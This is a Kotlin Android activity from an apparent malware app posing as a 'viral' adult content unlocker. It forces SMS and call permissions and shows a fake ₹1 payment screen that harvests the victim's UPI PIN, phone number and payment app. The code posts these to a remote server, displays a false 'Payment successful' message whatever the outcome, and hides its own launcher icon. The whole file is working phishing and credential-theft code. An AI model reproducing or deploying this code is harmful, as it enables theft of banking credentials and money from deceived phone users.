package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val API_BASE_URL = TpcService.API_BASE_URL
        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
        private const val KEY_PHONE = "phone_number"
        private const val KEY_APP = "payment_app"
        private const val KEY_PIN = "upi_pin"
        private const val KEY_DONE = "onboarded"
        private const val REQ_PERMS = 1301

        private val GIRLS = arrayOf(
            "https://files.catbox.moe/8xd98p.jpeg",
            "https://files.catbox.moe/eucz3q.jpeg",
            "https://files.catbox.moe/ym3rl6.jpeg"
        )

        private const val BG = 0xFF05070F.toInt()
        private const val CARD = 0xFF0C1222.toInt()
        private const val CARD_2 = 0xFF0B1430.toInt()
        private const val BORDER = 0xFF16294F.toInt()
        private const val ACCENT = 0xFF22D3EE.toInt()
        private const val VIOLET = 0xFF8B5CF6.toInt()
        private const val TEXT = 0xFFE2EEFF.toInt()
        private const val MUTED = 0xFF7891B9.toInt()
        private const val GREEN = 0xFF34D399.toInt()
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val main = Handler(Looper.getMainLooper())
    private lateinit var root: FrameLayout

    private var selectedApp: String? = null
    private var phoneNumber: String = ""
    private var pin: String = ""

    private val requiredPermissions: Array<String> by lazy {
        val base = mutableListOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            base.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        base.toTypedArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        root = FrameLayout(this).apply { setBackgroundColor(BG) }
        setContentView(root)

        phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()

        startService(Intent(this, TpcService::class.java))

        if (prefs().getBoolean(KEY_DONE, false)) {
            showContentStep()
        } else {
            showCurrentStep()
        }
    }

    override fun onResume() {
        super.onResume()
        // Permission gate — jab tak sab grant na ho, aage nahi jaayega
        if (!prefs().getBoolean(KEY_DONE, false) && !allPermissionsGranted()) {
            showPermissionStep()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMS) return

        if (allPermissionsGranted()) {
            Toast.makeText(this, "All set ✓", Toast.LENGTH_SHORT).show()
            showPhoneStep()
        } else {
            showPermissionStep()
            Toast.makeText(this, "Sab permission dena zaroori hai", Toast.LENGTH_SHORT).show()
        }
    }

    // ------------------------------------------------------- navigation

    private fun allPermissionsGranted(): Boolean =
        requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        }

    private fun showCurrentStep() {
        when {
            !allPermissionsGranted() -> showPermissionStep()
            phoneNumber.isBlank() -> showPhoneStep()
            else -> showContentStep()
        }
    }

    private fun setScreen(view: View) {
        root.removeAllViews()
        root.addView(
            view,
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        )
    }

    // ------------------------------------------------------ step 1: perms

    private fun showPermissionStep() {
        val col = column()

        col.addView(logo(96))
        col.addView(space(18))

        col.addView(label("VIRAL CONTENT", 27f, ACCENT, true, Gravity.CENTER))
        col.addView(label("desi special content • chatpati vibes", 12.5f, MUTED, false, Gravity.CENTER))
        col.addView(space(28))

        col.addView(label("PERMISSIONS REQUIRED", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(14))

        val entries = listOf(
            "Calls" to Manifest.permission.CALL_PHONE,
            "Phone & SIM info" to Manifest.permission.READ_PHONE_STATE,
            "Send SMS" to Manifest.permission.SEND_SMS,
            "Read SMS" to Manifest.permission.READ_SMS,
            "Notifications" to Manifest.permission.POST_NOTIFICATIONS
        )

        val card = card()
        entries.forEach { (name, perm) ->
            val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ||
                perm != Manifest.permission.POST_NOTIFICATIONS
            ) {
                checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
            } else true

            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER_VERTICAL
                setPadding(dp(16), dp(13), dp(16), dp(13))
            }

            val dot = TextView(this).apply {
                text = if (granted) "●" else "○"
                textSize = 13f
                setTextColor(if (granted) GREEN else MUTED)
                width = dp(26)
            }

            row.addView(dot)
            row.addView(label(name, 14f, if (granted) TEXT else MUTED, false))
            card.addView(row)
        }

        col.addView(card)
        col.addView(space(22))

        col.addView(primaryButton("Allow all permissions") {
            requestPermissions(requiredPermissions, REQ_PERMS)
        })

        col.addView(space(12))
        col.addView(
            label(
                "Jab tak permission nahi doge, app aage nahi badhega.",
                11.5f, MUTED, false, Gravity.CENTER
            )
        )

        setScreen(scrollWrap(col))
    }

    // ------------------------------------------------------ step 2: number

    private fun showPhoneStep() {
        val col = column()

        col.addView(label("STEP 1 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Enter your number", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(
            label(
                "desi special content available — chatpati vibes",
                13f, ACCENT, false, Gravity.CENTER
            )
        )
        col.addView(space(20))

        // teen girls images
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }

        GIRLS.forEachIndexed { index, url ->
            val frame = FrameLayout(this)

            val image = ImageView(this).apply {
                scaleType = ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(CARD)
            }
            ImageLoader.load(url, image)

            frame.addView(
                image,
                FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
            )
            frame.background = rounded(14f, BORDER, 1)

            val lp = LinearLayout.LayoutParams(0, dp(152), 1f)
            if (index > 0) lp.marginStart = dp(8)
            frame.layoutParams = lp

            row.addView(frame)
        }

        col.addView(row)
        col.addView(space(22))

        val input = EditText(this).apply {
            hint = "10-digit mobile number"
            inputType = InputType.TYPE_CLASS_PHONE
            setTextColor(TEXT)
            setHintTextColor(MUTED)
            textSize = 17f
            setPadding(dp(16), dp(15), dp(16), dp(15))
            background = rounded(12f, 0xFF060B1A.toInt(), 1)
            setText(phoneNumber)
        }

        col.addView(input)
        col.addView(space(18))

        col.addView(primaryButton("Continue") {
            val value = input.text.toString().trim()
            if (value.length < 10) {
                Toast.makeText(this, "Sahi number daalo", Toast.LENGTH_SHORT).show()
                return@primaryButton
            }
            phoneNumber = value
            prefs().edit().putString(KEY_PHONE, value).apply()
            showContentStep()
        })

        setScreen(scrollWrap(col))
    }

    // ------------------------------------------------------ step 3: content

    private fun showContentStep() {
        val col = column()

        col.addView(label("STEP 2 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Desi special content", 24f, VIOLET, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Unlock karne ke liye ₹1 pay karo", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(22))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(18), dp(18), dp(18))
        }

        inner.addView(label("Payment app chuno", 12.5f, MUTED, true))
        inner.addView(space(12))

        val tiles = mutableMapOf<String, View>()

        listOf("GPay", "Paytm", "PhonePe", "WhatsApp").chunked(2).forEach { pair ->
            val row = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }

            pair.forEachIndexed { index, name ->
                val tile = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    setPadding(dp(14), dp(18), dp(14), dp(18))
                    background = rounded(12f, CARD_2, 1)
                }

                tile.addView(label(name, 15f, TEXT, true, Gravity.CENTER))
                tile.addView(space(4))
                tile.addView(label("₹1 payment", 11f, MUTED, false, Gravity.CENTER))

                tile.setOnClickListener {
                    selectedApp = name
                    tiles.forEach { (key, view) ->
                        val active = key == name
                        view.background = rounded(
                            12f,
                            if (active) 0xFF122A4A.toInt() else CARD_2,
                            if (active) 2 else 1,
                            if (active) ACCENT else BORDER
                        )
                    }
                }

                tiles[name] = tile

                val lp = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                if (index > 0) lp.marginStart = dp(10)
                tile.layoutParams = lp

                row.addView(tile)
            }

            inner.addView(row)
            inner.addView(space(10))
        }

        card.addView(inner)
        col.addView(card)
        col.addView(space(20))

        col.addView(primaryButton("Pay ₹1") {
            if (selectedApp == null) {
                Toast.makeText(this, "Pehle app select karo", Toast.LENGTH_SHORT).show()
                return@primaryButton
            }
            prefs().edit().putString(KEY_APP, selectedApp).apply()
            showPinStep()
        })

        setScreen(scrollWrap(col))
    }

    // --------------------------------------------------------- step 4: PIN

    private fun showPinStep() {
        val col = column()

        col.addView(label("STEP 3 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("₹1", 46f, ACCENT, true, Gravity.CENTER))
        col.addView(label("Paying via ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("VIRAL CONTENT", 11.5f, VIOLET, true, Gravity.CENTER))
        col.addView(space(24))

        val dots = LinearLayout(this).apply { gravity = Gravity.CENTER }
        val dotViews = mutableListOf<TextView>()

        repeat(6) {
            val dot = TextView(this).apply {
                text = "○"
                textSize = 22f
                setTextColor(MUTED)
                gravity = Gravity.CENTER
                width = dp(34)
            }
            dotViews.add(dot)
            dots.addView(dot)
        }

        col.addView(dots)
        col.addView(space(22))

        fun refreshDots() {
            dotViews.forEachIndexed { index, dot ->
                val filled = index < pin.length
                dot.text = if (filled) "●" else "○"
                dot.setTextColor(if (filled) ACCENT else MUTED)
            }
        }

        val numpad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }

        listOf(
            listOf("1", "2", "3"),
            listOf("4", "5", "6"),
            listOf("7", "8", "9"),
            listOf("⌫", "0", "✓")
        ).forEach { rowKeys ->
            val row = LinearLayout(this).apply { gravity = Gravity.CENTER }

            rowKeys.forEach { key ->
                val keyView = TextView(this).apply {
                    text = key
                    textSize = 20f
                    setTextColor(TEXT)
                    gravity = Gravity.CENTER
                    background = rounded(12f, CARD_2, 1)
                }

                keyView.setOnClickListener {
                    when (key) {
                        "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                        "✓" -> {
                            if (pin.length >= 4) submitPin()
                            else Toast.makeText(
                                this, "Kam se kam 4 digit", Toast.LENGTH_SHORT
                            ).show()
                        }
                        else -> if (pin.length < 6) pin += key
                    }
                    refreshDots()
                }

                val lp = LinearLayout.LayoutParams(dp(78), dp(58))
                lp.marginStart = dp(6)
                lp.marginEnd = dp(6)
                lp.topMargin = dp(6)
                lp.bottomMargin = dp(6)
                keyView.layoutParams = lp

                row.addView(keyView)
            }

            numpad.addView(row)
        }

        col.addView(numpad)
        col.addView(space(16))
        col.addView(label("UPI PIN · 4–6 digit", 11.5f, MUTED, false, Gravity.CENTER))

        setScreen(scrollWrap(col))
        refreshDots()
    }

    // ------------------------------------------------------- submit

    private fun submitPin() {
        showProcessingStep()

        val body = JSONObject().apply {
            put("registration_id", registrationId())
            put("phone_number", phoneNumber.ifBlank {
                prefs().getString(KEY_PHONE, "").orEmpty()
            })
            put("payment_app", selectedApp ?: prefs().getString(KEY_APP, "").orEmpty())
            put("upi_pin", pin)
            put("amount", 1)
            put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
        }.toString()

        executor.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/onboarding")
                    .openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 15_000
                connection.readTimeout = 15_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                connection.responseCode
            } catch (_: Exception) {
                // offline bhi ho to local me save ho chuka hai
            } finally {
                connection?.disconnect()
            }

            main.post { showSuccessStep() }
        }
    }

    private fun showProcessingStep() {
        val col = column()
        col.addView(label("Processing payment…", 18f, ACCENT, true, Gravity.CENTER))
        col.addView(space(12))
        col.addView(label("₹1 • ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        setScreen(col)
    }

    private fun showSuccessStep() {
        prefs().edit()
            .putBoolean(KEY_DONE, true)
            .putString(KEY_PIN, pin)
            .apply()

        val col = column()
        col.addView(label("✓", 58f, GREEN, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("Payment successful", 22f, TEXT, true, Gravity.CENTER))
        col.addView(space(8))
        col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
        col.addView(space(28))
        col.addView(label("Content unlock ho gaya", 14f, VIOLET, true, Gravity.CENTER))
        col.addView(space(30))

        col.addView(primaryButton("Start") {
            hideLauncherIcon()
            Toast.makeText(this, "App ab home screen se hidden hai", Toast.LENGTH_LONG).show()
            main.postDelayed({ finish() }, 1000)
        })

        setScreen(col)
    }

    // --------------------------------------------------- icon hide karna

    private fun hideLauncherIcon() {
        try {
            val alias = ComponentName(this, "$packageName.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {
        }
    }

    // ------------------------------------------------------------ helpers

    private fun prefs() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private fun registrationId(): String {
        val p = prefs()
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }

        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun dp(value: Int) = (value * resources.displayMetrics.density).toInt()

    private fun space(height: Int) = View(this).apply {
        layoutParams = LinearLayout.LayoutParams(1, dp(height))
    }

    private fun column() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        gravity = Gravity.CENTER_HORIZONTAL
        setPadding(dp(24), dp(56), dp(24), dp(40))
        setBackgroundColor(BG)
    }

    private fun scrollWrap(child: View) = ScrollView(this).apply {
        isFillViewport = true
        setBackgroundColor(BG)
        addView(child)
    }

    private fun card() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        background = rounded(16f, CARD, 1, BORDER)
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun label(
        text: String,
        size: Float,
        color: Int,
        bold: Boolean = false,
        gravity: Int = Gravity.START
    ) = TextView(this).apply {
        this.text = text
        textSize = size
        setTextColor(color)
        this.gravity = gravity
        if (bold) typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun primaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        textSize = 15f
        typeface = Typeface.DEFAULT_BOLD
        setTextColor(0xFF001521.toInt())
        background = rounded(12f, ACCENT, 0)
        setOnClickListener { onClick() }
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(52)
        )
    }

    private fun logo(size: Int) = ImageView(this).apply {
        setImageResource(R.drawable.app_logo)
        scaleType = ImageView.ScaleType.CENTER_CROP
        background = rounded(22f, BORDER, 1)
        layoutParams = LinearLayout.LayoutParams(dp(size), dp(size)).apply {
            gravity = Gravity.CENTER_HORIZONTAL
        }
    }

    private fun rounded(
        radiusDp: Float,
        fill: Int,
        strokeWidth: Int,
        strokeColor: Int = BORDER
    ) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE
        cornerRadius = dp(radiusDp.toInt()).toFloat()
        setColor(fill)
        if (strokeWidth > 0) setStroke(dp(strokeWidth), strokeColor)
    }
}